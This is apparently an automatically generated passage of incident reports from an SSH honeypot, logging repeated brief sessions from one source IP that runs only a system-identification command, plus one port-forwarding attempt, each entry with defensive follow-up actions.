| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:47:22` | `cowrie.session.connect` |
| `2026-07-19 10:47:24` | `cowrie.client.version` |
| `2026-07-19 10:47:24` | `cowrie.client.kex` |
| `2026-07-19 10:47:29` | `cowrie.login.success` |
| `2026-07-19 10:47:33` | `cowrie.session.params` |
| `2026-07-19 10:47:33` | `cowrie.command.input` |
| `2026-07-19 10:47:35` | `cowrie.log.closed` |
| `2026-07-19 10:47:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc078c6958cb

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:47 |
| **Last Seen** | 2026-07-19 10:47 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:47:33` | `cowrie.session.connect` |
| `2026-07-19 10:47:35` | `cowrie.client.version` |
| `2026-07-19 10:47:35` | `cowrie.client.kex` |
| `2026-07-19 10:47:44` | `cowrie.login.success` |
| `2026-07-19 10:47:48` | `cowrie.session.params` |
| `2026-07-19 10:47:48` | `cowrie.command.input` |
| `2026-07-19 10:47:50` | `cowrie.log.closed` |
| `2026-07-19 10:47:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a199cffb2b06

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:47 |
| **Last Seen** | 2026-07-19 10:48 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:47:46` | `cowrie.session.connect` |
| `2026-07-19 10:47:48` | `cowrie.client.version` |
| `2026-07-19 10:47:48` | `cowrie.client.kex` |
| `2026-07-19 10:47:56` | `cowrie.login.success` |
| `2026-07-19 10:48:02` | `cowrie.session.params` |
| `2026-07-19 10:48:02` | `cowrie.command.input` |
| `2026-07-19 10:48:04` | `cowrie.log.closed` |
| `2026-07-19 10:48:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec2560c4d9c6

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:47 |
| **Last Seen** | 2026-07-19 10:48 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:47:57` | `cowrie.session.connect` |
| `2026-07-19 10:48:00` | `cowrie.client.version` |
| `2026-07-19 10:48:00` | `cowrie.client.kex` |
| `2026-07-19 10:48:06` | `cowrie.login.success` |
| `2026-07-19 10:48:09` | `cowrie.session.params` |
| `2026-07-19 10:48:09` | `cowrie.command.input` |
| `2026-07-19 10:48:10` | `cowrie.log.closed` |
| `2026-07-19 10:48:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-249ab225a1f2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:48 |
| **Last Seen** | 2026-07-19 10:48 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:48:15` | `cowrie.session.connect` |
| `2026-07-19 10:48:16` | `cowrie.client.version` |
| `2026-07-19 10:48:16` | `cowrie.client.kex` |
| `2026-07-19 10:48:23` | `cowrie.login.success` |
| `2026-07-19 10:48:28` | `cowrie.session.params` |
| `2026-07-19 10:48:28` | `cowrie.command.input` |
| `2026-07-19 10:48:32` | `cowrie.log.closed` |
| `2026-07-19 10:48:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a88473d8ef31

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:48 |
| **Last Seen** | 2026-07-19 10:48 |
| **Session Duration** | 30s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:48:24` | `cowrie.session.connect` |
| `2026-07-19 10:48:27` | `cowrie.client.version` |
| `2026-07-19 10:48:27` | `cowrie.client.kex` |
| `2026-07-19 10:48:43` | `cowrie.login.success` |
| `2026-07-19 10:48:50` | `cowrie.session.params` |
| `2026-07-19 10:48:50` | `cowrie.command.input` |
| `2026-07-19 10:48:55` | `cowrie.log.closed` |
| `2026-07-19 10:48:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b049eb3c243e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:48 |
| **Last Seen** | 2026-07-19 10:49 |
| **Session Duration** | 28s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:48:33` | `cowrie.session.connect` |
| `2026-07-19 10:48:38` | `cowrie.client.version` |
| `2026-07-19 10:48:38` | `cowrie.client.kex` |
| `2026-07-19 10:48:53` | `cowrie.login.success` |
| `2026-07-19 10:48:59` | `cowrie.session.params` |
| `2026-07-19 10:48:59` | `cowrie.command.input` |
| `2026-07-19 10:49:02` | `cowrie.log.closed` |
| `2026-07-19 10:49:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40057ebe211a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:48 |
| **Last Seen** | 2026-07-19 10:49 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:48:50` | `cowrie.session.connect` |
| `2026-07-19 10:48:54` | `cowrie.client.version` |
| `2026-07-19 10:48:54` | `cowrie.client.kex` |
| `2026-07-19 10:49:02` | `cowrie.login.success` |
| `2026-07-19 10:49:07` | `cowrie.session.params` |
| `2026-07-19 10:49:07` | `cowrie.command.input` |
| `2026-07-19 10:49:10` | `cowrie.log.closed` |
| `2026-07-19 10:49:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2248ca6af4a4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:49 |
| **Last Seen** | 2026-07-19 10:49 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:49:04` | `cowrie.session.connect` |
| `2026-07-19 10:49:07` | `cowrie.client.version` |
| `2026-07-19 10:49:07` | `cowrie.client.kex` |
| `2026-07-19 10:49:15` | `cowrie.login.success` |
| `2026-07-19 10:49:19` | `cowrie.session.params` |
| `2026-07-19 10:49:19` | `cowrie.command.input` |
| `2026-07-19 10:49:20` | `cowrie.log.closed` |
| `2026-07-19 10:49:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-81a10c70f182

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:49 |
| **Last Seen** | 2026-07-19 10:49 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:49:20` | `cowrie.session.connect` |
| `2026-07-19 10:49:22` | `cowrie.client.version` |
| `2026-07-19 10:49:22` | `cowrie.client.kex` |
| `2026-07-19 10:49:28` | `cowrie.login.success` |
| `2026-07-19 10:49:32` | `cowrie.session.params` |
| `2026-07-19 10:49:32` | `cowrie.command.input` |
| `2026-07-19 10:49:34` | `cowrie.log.closed` |
| `2026-07-19 10:49:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59c42a26a01e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:49 |
| **Last Seen** | 2026-07-19 10:49 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:49:33` | `cowrie.session.connect` |
| `2026-07-19 10:49:35` | `cowrie.client.version` |
| `2026-07-19 10:49:35` | `cowrie.client.kex` |
| `2026-07-19 10:49:44` | `cowrie.login.success` |
| `2026-07-19 10:49:51` | `cowrie.session.params` |
| `2026-07-19 10:49:51` | `cowrie.command.input` |
| `2026-07-19 10:49:52` | `cowrie.log.closed` |
| `2026-07-19 10:49:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25fb33b096cc

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:49 |
| **Last Seen** | 2026-07-19 10:49 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:49:42` | `cowrie.session.connect` |
| `2026-07-19 10:49:44` | `cowrie.client.version` |
| `2026-07-19 10:49:44` | `cowrie.client.kex` |
| `2026-07-19 10:49:51` | `cowrie.login.success` |
| `2026-07-19 10:49:52` | `cowrie.session.params` |
| `2026-07-19 10:49:52` | `cowrie.command.input` |
| `2026-07-19 10:49:53` | `cowrie.log.closed` |
| `2026-07-19 10:49:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc96197b6b99

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:49 |
| **Last Seen** | 2026-07-19 10:50 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:49:57` | `cowrie.session.connect` |
| `2026-07-19 10:49:58` | `cowrie.client.version` |
| `2026-07-19 10:49:58` | `cowrie.client.kex` |
| `2026-07-19 10:50:07` | `cowrie.login.success` |
| `2026-07-19 10:50:12` | `cowrie.session.params` |
| `2026-07-19 10:50:12` | `cowrie.command.input` |
| `2026-07-19 10:50:14` | `cowrie.log.closed` |
| `2026-07-19 10:50:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-73ac51e8cac0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:50 |
| **Last Seen** | 2026-07-19 10:50 |
| **Session Duration** | 20s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:50:09` | `cowrie.session.connect` |
| `2026-07-19 10:50:12` | `cowrie.client.version` |
| `2026-07-19 10:50:12` | `cowrie.client.kex` |
| `2026-07-19 10:50:24` | `cowrie.login.success` |
| `2026-07-19 10:50:28` | `cowrie.session.params` |
| `2026-07-19 10:50:28` | `cowrie.command.input` |
| `2026-07-19 10:50:30` | `cowrie.log.closed` |
| `2026-07-19 10:50:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-73cbb0486966

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:50 |
| **Last Seen** | 2026-07-19 10:50 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:50:19` | `cowrie.session.connect` |
| `2026-07-19 10:50:23` | `cowrie.client.version` |
| `2026-07-19 10:50:23` | `cowrie.client.kex` |
| `2026-07-19 10:50:30` | `cowrie.login.success` |
| `2026-07-19 10:50:36` | `cowrie.session.params` |
| `2026-07-19 10:50:36` | `cowrie.command.input` |
| `2026-07-19 10:50:38` | `cowrie.log.closed` |
| `2026-07-19 10:50:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c0623d3c683

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:50 |
| **Last Seen** | 2026-07-19 10:50 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:50:32` | `cowrie.session.connect` |
| `2026-07-19 10:50:36` | `cowrie.client.version` |
| `2026-07-19 10:50:36` | `cowrie.client.kex` |
| `2026-07-19 10:50:45` | `cowrie.login.success` |
| `2026-07-19 10:50:49` | `cowrie.session.params` |
| `2026-07-19 10:50:49` | `cowrie.command.input` |
| `2026-07-19 10:50:50` | `cowrie.log.closed` |
| `2026-07-19 10:50:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45f42347bc3c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:50 |
| **Last Seen** | 2026-07-19 10:50 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:50:49` | `cowrie.session.connect` |
| `2026-07-19 10:50:50` | `cowrie.client.version` |
| `2026-07-19 10:50:50` | `cowrie.client.kex` |
| `2026-07-19 10:50:55` | `cowrie.login.success` |
| `2026-07-19 10:50:58` | `cowrie.session.params` |
| `2026-07-19 10:50:58` | `cowrie.command.input` |
| `2026-07-19 10:50:59` | `cowrie.log.closed` |
| `2026-07-19 10:50:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e65cb39cac46

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:51 |
| **Last Seen** | 2026-07-19 10:51 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:51:04` | `cowrie.session.connect` |
| `2026-07-19 10:51:04` | `cowrie.client.version` |
| `2026-07-19 10:51:04` | `cowrie.client.kex` |
| `2026-07-19 10:51:10` | `cowrie.login.success` |
| `2026-07-19 10:51:14` | `cowrie.session.params` |
| `2026-07-19 10:51:14` | `cowrie.command.input` |
| `2026-07-19 10:51:16` | `cowrie.log.closed` |
| `2026-07-19 10:51:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8b0cfa0777c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:51 |
| **Last Seen** | 2026-07-19 10:51 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:51:13` | `cowrie.session.connect` |
| `2026-07-19 10:51:15` | `cowrie.client.version` |
| `2026-07-19 10:51:15` | `cowrie.client.kex` |
| `2026-07-19 10:51:21` | `cowrie.login.success` |
| `2026-07-19 10:51:24` | `cowrie.session.params` |
| `2026-07-19 10:51:24` | `cowrie.command.input` |
| `2026-07-19 10:51:25` | `cowrie.log.closed` |
| `2026-07-19 10:51:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9546a3ae3ad3

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:51 |
| **Last Seen** | 2026-07-19 10:51 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:51:27` | `cowrie.session.connect` |
| `2026-07-19 10:51:28` | `cowrie.client.version` |
| `2026-07-19 10:51:28` | `cowrie.client.kex` |
| `2026-07-19 10:51:33` | `cowrie.login.success` |
| `2026-07-19 10:51:37` | `cowrie.session.params` |
| `2026-07-19 10:51:37` | `cowrie.command.input` |
| `2026-07-19 10:51:38` | `cowrie.log.closed` |
| `2026-07-19 10:51:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5bcaade5342b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:51 |
| **Last Seen** | 2026-07-19 10:51 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:51:40` | `cowrie.session.connect` |
| `2026-07-19 10:51:41` | `cowrie.client.version` |
| `2026-07-19 10:51:41` | `cowrie.client.kex` |
| `2026-07-19 10:51:45` | `cowrie.login.success` |
| `2026-07-19 10:51:48` | `cowrie.session.params` |
| `2026-07-19 10:51:48` | `cowrie.command.input` |
| `2026-07-19 10:51:49` | `cowrie.log.closed` |
| `2026-07-19 10:51:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b06744047b6

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:51 |
| **Last Seen** | 2026-07-19 10:52 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:51:53` | `cowrie.session.connect` |
| `2026-07-19 10:51:53` | `cowrie.client.version` |
| `2026-07-19 10:51:53` | `cowrie.client.kex` |
| `2026-07-19 10:51:59` | `cowrie.login.success` |
| `2026-07-19 10:52:01` | `cowrie.session.params` |
| `2026-07-19 10:52:01` | `cowrie.command.input` |
| `2026-07-19 10:52:02` | `cowrie.log.closed` |
| `2026-07-19 10:52:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-789b9d8a411e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:52 |
| **Last Seen** | 2026-07-19 10:52 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:52:05` | `cowrie.session.connect` |
| `2026-07-19 10:52:07` | `cowrie.client.version` |
| `2026-07-19 10:52:07` | `cowrie.client.kex` |
| `2026-07-19 10:52:10` | `cowrie.login.success` |
| `2026-07-19 10:52:12` | `cowrie.session.params` |
| `2026-07-19 10:52:12` | `cowrie.command.input` |
| `2026-07-19 10:52:14` | `cowrie.log.closed` |
| `2026-07-19 10:52:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a4a6662ccd9f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:52 |
| **Last Seen** | 2026-07-19 10:52 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:52:19` | `cowrie.session.connect` |
| `2026-07-19 10:52:20` | `cowrie.client.version` |
| `2026-07-19 10:52:20` | `cowrie.client.kex` |
| `2026-07-19 10:52:24` | `cowrie.login.success` |
| `2026-07-19 10:52:27` | `cowrie.session.params` |
| `2026-07-19 10:52:27` | `cowrie.command.input` |
| `2026-07-19 10:52:28` | `cowrie.log.closed` |
| `2026-07-19 10:52:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ce922ee68d1

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:52 |
| **Last Seen** | 2026-07-19 10:52 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:52:30` | `cowrie.session.connect` |
| `2026-07-19 10:52:32` | `cowrie.client.version` |
| `2026-07-19 10:52:32` | `cowrie.client.kex` |
| `2026-07-19 10:52:39` | `cowrie.login.success` |
| `2026-07-19 10:52:44` | `cowrie.session.params` |
| `2026-07-19 10:52:44` | `cowrie.command.input` |
| `2026-07-19 10:52:45` | `cowrie.log.closed` |
| `2026-07-19 10:52:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db1e36c29927

| Field | Detail |
|---|---|
| **Source IP** | `203.75.170[.]63` |
| **First Seen** | 2026-07-19 10:52 |
| **Last Seen** | 2026-07-19 10:52 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:52:41` | `cowrie.session.connect` |
| `2026-07-19 10:52:42` | `cowrie.client.version` |
| `2026-07-19 10:52:42` | `cowrie.client.kex` |
| `2026-07-19 10:52:45` | `cowrie.login.success` |
| `2026-07-19 10:52:46` | `cowrie.direct-tcpip.request` |
| `2026-07-19 10:52:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.75.170[.]63` to AbuseIPDB if not already reported
- [ ] Block `203.75.170[.]63` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
